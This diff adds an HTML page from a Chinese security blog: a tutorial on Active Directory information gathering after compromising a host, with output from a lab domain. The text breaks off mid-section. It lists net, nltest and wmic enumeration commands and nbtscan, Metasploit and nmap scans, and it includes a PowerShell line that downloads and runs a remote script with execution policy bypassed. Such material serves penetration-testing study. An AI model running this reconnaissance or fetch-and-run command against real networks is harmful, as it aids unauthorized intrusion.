@@ -1,0 +1,641 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>域渗透-信息收集 - 我在开了灯的床头下，想问问自己的心啊</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="基本信息12345678910111213141516...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '/images/theme/loading.gif'
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '/images/theme/welcome-image.jpg',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'simple'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+    </div>
+    <div class="center">域渗透-信息收集</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+
+<nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>  Powered by B1gd0g  </p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3692939895,1462830012&fm=26&gp=0.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">域渗透-信息收集</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>February 21, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>8584</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 网络信息</span><br><span class="hljs-variable">$</span> ipconfig /all    <span class="hljs-comment"># 查询网络配置信息</span><br><br><span class="hljs-comment"># 系统信息</span><br><span class="hljs-variable">$</span> systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS 名称&quot;</span> /C:<span class="hljs-string">&quot;OS 版本&quot;</span>  <span class="hljs-comment"># 查询操作系统和软件信息</span><br><span class="hljs-variable">$</span> systeminfo       <span class="hljs-comment"># 查看补丁列表</span><br><span class="hljs-variable">$</span> wmic qfe get Caption,Description,HotFixID,InstallOn <span class="hljs-comment"># 查看安装在系统的补丁</span><br><br><span class="hljs-comment"># 服务信息</span><br><span class="hljs-variable">$</span> wmic service list brief  <span class="hljs-comment"># 查询本机服务信息</span><br><span class="hljs-variable">$</span> wmic <span class="hljs-keyword">process</span> list brief  <span class="hljs-comment"># 查询进程列表</span><br><span class="hljs-variable">$</span> wmic startup get commond,caption <span class="hljs-comment"># 查看启动程序信息</span><br><br><span class="hljs-comment"># 用户信息</span><br><span class="hljs-variable">$</span> net user                       <span class="hljs-comment"># 查询用户列表</span><br><span class="hljs-variable">$</span> net localgroup Administrators  <span class="hljs-comment"># 本地管理员</span><br><span class="hljs-variable">$</span> query user || qwinsta          <span class="hljs-comment"># 当前在线用户</span><br><br><span class="hljs-comment"># 进程信息</span><br><span class="hljs-variable">$</span> tasklist<br><span class="hljs-variable">$</span> wmic <span class="hljs-keyword">process</span> list brief<br><br><span class="hljs-comment"># 其它信息</span><br><span class="hljs-variable">$</span> netstat <span class="hljs-literal">-ano</span>  <span class="hljs-comment"># 查询端口列表</span><br><span class="hljs-variable">$</span> net share     <span class="hljs-comment"># 查询本机共享列表</span><br><span class="hljs-variable">$</span> route print   <span class="hljs-comment"># 路由表</span><br><span class="hljs-variable">$</span> arp <span class="hljs-literal">-a</span>        <span class="hljs-comment"># ARP表</span><br><span class="hljs-variable">$</span> ipconfig /displaydns    <span class="hljs-comment"># 查看dns缓存</span><br><span class="hljs-variable">$</span> netsh firewall show config  <span class="hljs-comment"># 查询防火墙相关配置</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><ul>
+<li><p>获取一台主机后，一般有3种情况：</p>
+</li>
+<li><ul>
+<li>本地普通用户，<code>win-2008\user</code></li>
+</ul>
+</li>
+<li><ul>
+<li>本地管理员用户，<code>win7-test\administrator</code></li>
+</ul>
+</li>
+<li><ul>
+<li>域内用户，<code>hacker\administrator</code></li>
+</ul>
+</li>
+<li><p>其中本地普通用户只能查询本机信息，不能查询域内信息，而本地管理员和域内用户均可查询域内信息。</p>
+</li>
+<li><p>域内所有查询都通过域控制器(DC)实现，而这个查询会自动使用Kerberos协议进行认证，无须输入账号密码。</p>
+</li>
+<li><p>获取域SID</p>
+</li>
+<li><ul>
+<li>当前域<code>hack-naraku</code>的SID：<code>S-1-5-21-1481718049-2714097393-3961720286</code></li>
+<li>域用户<code>winuser</code>的SID：<code>S-1-5-21-1481718049-2714097393-3961720286-1108</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ whoami<br><br>用户名              SID<br>=================== ==============================================<br>hack-naraku\winuser S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1481718049</span><span class="hljs-string">-2714097393</span><span class="hljs-string">-3961720286</span><span class="hljs-string">-1108</span><br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li><p>查询指定用户信息</p>
+</li>
+<li><ul>
+<li>该用户在本地组中没有本地管理员权限</li>
+<li>在域中属于<code>Domain Users</code>组</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">$ net user winuser /domain<br><br>.............<br>本地组成员<br>全局组成员             *Domain Users<br>.............<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><ul>
+<li>使用<code>ipconfig</code></li>
+</ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> ipconfig /<span class="hljs-keyword">all</span><br><span class="hljs-symbol">$</span> nslookup &lt;DNS服务器&gt;<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>查询系统信息</p>
+</li>
+<li><ul>
+<li>域：域名。如果域为<code>WORKGROUP</code>则表示当前服务器不在域内</li>
+<li>登录服务器：域控制器</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>systeminfo<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>查询当前登录域及登录用户</p>
+</li>
+<li><ul>
+<li>工作站域DNS名称：域名。如果为<code>WORKGROUP</code>则表示当前为非域环境</li>
+<li>登录域：用于表示当前表示的用户是域用户还是本地用户</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ net <span class="hljs-built_in">config</span> workstation<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>判断主域</p>
+</li>
+<li><ul>
+<li>正常执行：存在域，且当前用户是域用户</li>
+</ul>
+</li>
+<li><ul>
+<li>拒绝访问：存在域，但当前用户不是域用户</li>
+<li>找不到域<code>WORKGROUP</code>的域控制器：不存在域</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">$ <span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="NetBIOS探测"><a href="#NetBIOS探测" class="headerlink" title="NetBIOS探测"></a>NetBIOS探测</h3><ul>
+<li><code>nbtscan.exe</code>：一个命令行工具，用于扫描目标网络中开放的NetBIOS名称服务器</li>
+</ul>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ nbtscan.exe <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><br><span class="hljs-number">192.168.1.7</span>     HACK-NARAKU\WIN7                SHARING<br><span class="hljs-number">192.168.1.12</span>    HACK-NARAKU\DC                  SHARING DC<br>*timeout (normal end of scan)<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="ICMP探测"><a href="#ICMP探测" class="headerlink" title="ICMP探测"></a>ICMP探测</h3><ul>
+<li>对指定网段中的每个IP地址使用<code>ping</code>命令</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (1,1,254) <span class="hljs-keyword">DO</span> @ping -w 1 -n 1 192.168.1.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br><br>来自 192.168.1.7 的回复: 字节=32 时间&lt;1ms <span class="hljs-attribute">TTL</span>=128<br>来自 192.168.1.12 的回复: 字节=32 时间=1ms <span class="hljs-attribute">TTL</span>=128<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="ARP探测"><a href="#ARP探测" class="headerlink" title="ARP探测"></a>ARP探测</h3><ul>
+<li><code>arp-scan.exe</code></li>
+</ul>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ arp-scan.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>Reply that <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:C0:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> is <span class="hljs-number">192.168.1.1</span> in <span class="hljs-number">2.870200</span><br>Reply that <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">0</span><span class="hljs-keyword">A</span>:<span class="hljs-number">7</span>C:<span class="hljs-number">7</span>F is <span class="hljs-number">192.168.1.7</span> in <span class="hljs-number">0.060100</span><br>Reply that <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">93</span>:<span class="hljs-number">97</span>:DC is <span class="hljs-number">192.168.1.12</span> in <span class="hljs-number">16.301800</span><br>Reply that <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:EA:<span class="hljs-number">98</span>:CF is <span class="hljs-number">192.168.1.254</span> in <span class="hljs-number">15.253300</span><br>Reply that <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">0</span><span class="hljs-keyword">A</span>:<span class="hljs-number">7</span>C:<span class="hljs-number">7</span>F is <span class="hljs-number">192.168.1.255</span> in <span class="hljs-number">0.102700</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><ul>
+<li><p><strong>Metasploit端口扫描</strong>：MSF提供多种端口扫描技术，还提供与其它扫描工具的接口</p>
+</li>
+<li><ul>
+<li>可在<code>msfconsole</code>下运行<code>search portscan</code>搜索端口扫描模块</li>
+<li>这里使用的是<code>auxiliary/scanner/portscan/tcp</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> msfconsole<br>msf5 &gt; use auxiliary/scanner/portscan/tcp <br>msf5 auxiliary(scanner/portscan/tcp) &gt; show <span class="hljs-keyword">options</span><br>msf5 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.1.12</span><br>msf5 <span class="hljs-comment">auxiliary(scanner</span>/portscan/<span class="hljs-comment">tcp) &gt; set PORTS 1-1024</span><br>msf5 <span class="hljs-comment">auxiliary(scanner</span>/portscan/<span class="hljs-comment">tcp) &gt; run</span><br><br>[+] 192.168.1.12:         - 192.168.1.12:53 - TCP <span class="hljs-comment">OPEN</span><br>.......<br><br>[+] 192.168.1.12:         - 192.168.1.12:636 - TCP <span class="hljs-comment">OPEN</span><br>[*] 192.168.1.12:         - Scanned <span class="hljs-comment">1 of 1 hosts (100% complete)</span><br>[*] Auxiliary <span class="hljs-comment">module execution completed</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>Nmap</li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ nmap -<span class="hljs-built_in">sP</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>Netcat：端口Banner信息</li>
+</ul>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ nc -nv <span class="hljs-number">192.168.1.12</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/">Nishang</a>中的<code>Scan/Invoke-PortScan.ps1</code>模块</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>中的<code>Recon/Invoke-PortScan.ps1</code>脚本</li>
+</ul>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 远程下载脚本并执行</span><br>$ powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;); Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;80,445,1433,8080,3389&#x27; -oA temp.txt&quot;</span><br><br><span class="hljs-comment"># 执行本地ps脚本</span><br>$ powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;Import-Module C:\Invoke-Portscan.ps1; Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;80,445,1433,8080,3389&#x27; -oA temp.txt&quot;</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>其它</p>
+</li>
+<li><ul>
+<li>telnet：需要先开启telnet服务</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ telnet <span class="hljs-number">192.168.1.12</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li><ul>
+<li>S扫描器：早期的一个扫描器</li>
+</ul>
+</li>
+</ul>
+<h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><blockquote>
+<p>需要先启动<code>Computer Browser</code>服务</p>
+</blockquote>
+<p><img   class="lazyload" data-original="https://cdn.naraku.cn/imgs/Intranet/Info-Computer_Browser-1.jpg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_TmFyYWt1,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<p><img   class="lazyload" data-original="https://cdn.naraku.cn/imgs/Intranet/Info-Computer_Browser-2.jpg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_10,text_TmFyYWt1,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> net view /domain                      <span class="hljs-comment"># 查询域</span><br><span class="hljs-variable">$</span> net view /domain:HACK<span class="hljs-literal">-NARAKU</span>          <span class="hljs-comment"># 查询域内所有计算机</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> /domain                     <span class="hljs-comment"># 查询域内所有用户组</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain  <span class="hljs-comment"># 查询所有域成员</span><br><span class="hljs-variable">$</span> net accounts /domain                  <span class="hljs-comment"># 查询域密码策略</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="nltest信任域"><a href="#nltest信任域" class="headerlink" title="nltest信任域"></a>nltest信任域</h2><ul>
+<li><p>信任域：可以在工作组里查询，查询内网是否有域环境</p>
+</li>
+<li><ul>
+<li>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/dreamer-fish/p/3473895.html">Nltest相关命令</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ nltest <span class="hljs-string">/domain_trusts</span><br><br><span class="hljs-comment"># 返回所有信任 192.168.1.7 的域</span><br>$ nltest <span class="hljs-string">/domain_trusts</span> <span class="hljs-string">/all_trusts</span> <span class="hljs-string">/v</span> <span class="hljs-string">/server</span>:&lt;域控IP&gt;<br><br><span class="hljs-comment"># 返回域控和其相对应的IP地址,XXXXX是上一条命令结果中的一个域</span><br>$ nltest <span class="hljs-string">/dsgetdc</span>:&lt;XXXXX&gt; <span class="hljs-string">/server</span><span class="hljs-function">:192.168.1.12</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h2><ul>
+<li>查看域控的机器名</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ nltest /DCLIST:hack-naraku<br><br>获得域“hack-naraku”中 DC 的列表(从“\\DC”中)。<br>    DC<span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.naraku</span> <span class="hljs-selector-attr">[PDC]</span>  <span class="hljs-selector-attr">[DS]</span> 站点: Default-First-Site-Name<br>此命令成功完成<br></code></pre></td></tr></table></figure>
+<ul>
+<li>查看域控的主机名</li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$ nslookup -<span class="hljs-keyword">type</span>=SRV <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_ldap</span>.</span><span class="hljs-module"><span class="hljs-identifier">_tcp</span></span></span><br><span class="hljs-module-access"><span class="hljs-module"></span></span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DNS</span> </span></span>request timed out.<br>    timeout was <span class="hljs-number">2</span> seconds.<br>服务器:  UnKnown<br>Address:  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.12</span><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_ldap</span>.</span><span class="hljs-module"><span class="hljs-identifier">_tcp</span>.</span></span>hack.naraku  SRV service location:<br>          priority       = <span class="hljs-number">0</span><br>          weight         = <span class="hljs-number">100</span><br>          port           = <span class="hljs-number">389</span><br>          svr hostname   = dc.hack.naraku<br>dc.hack.naraku  internet address = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.12</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>查看时间</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ net <span class="hljs-selector-tag">time</span> /domain<br><br>\\DC<span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.naraku</span> 的当前时间是 <span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">19</span> <span class="hljs-number">12</span>:<span class="hljs-number">38</span>:<span class="hljs-number">28</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>查看域控组</li>
+</ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span><br><br>这项请求将在域 hack.naraku 的域控制器处理。<br><br>组名     <span class="hljs-keyword">Domain</span> Controllers<br>注释     域中所有域控制器<br><br>成员<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>DC$<br>命令成功完成。<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h2><ul>
+<li>查询所有域用户列表</li>
+</ul>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span>               <span class="hljs-comment"># 向域控进行查询</span><br>$ wmic useraccount get /all      <span class="hljs-comment"># 获取域内用户信息</span><br>$ net localgroup administrators  <span class="hljs-comment"># 查询本地管理员组用户</span><br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>查询域管理员用户</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain     <span class="hljs-comment"># 查询域管理员用户</span><br><span class="hljs-variable">$</span> net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain <span class="hljs-comment"># 查询管理员用户组</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><ul>
+<li>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/riyir/p/12735443.html">定位域管理员</a></li>
+</ul>
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>在一个域中，当计算机加入域后，会默认给域管理员赋予本地系统管理员权限。因此，域管理员均可以访问本地计算机，且具备完全控制权限。</p>
+</blockquote>
+<p>定位域内管理员的两种渠道：日志和会话。</p>
+<ul>
+<li><p>日志是指本地机器的管理员日志，可以使用脚本或<code>Wevtutil</code>工具导出并查看。</p>
+</li>
+<li><p>会话是指域内每台机器的登陆会话，可以使用<code>netsess.exe</code>或<code>PowerView</code>等工具查询（可匿名查询，无需权限）。</p>
+</li>
+</ul>
+<h3 id="PsLoggedOn"><a href="#PsLoggedOn" class="headerlink" title="PsLoggedOn"></a>PsLoggedOn</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">PsLoggedOn.exe</a>：可以查看本地登录的用户</p>
+</blockquote>
+<ul>
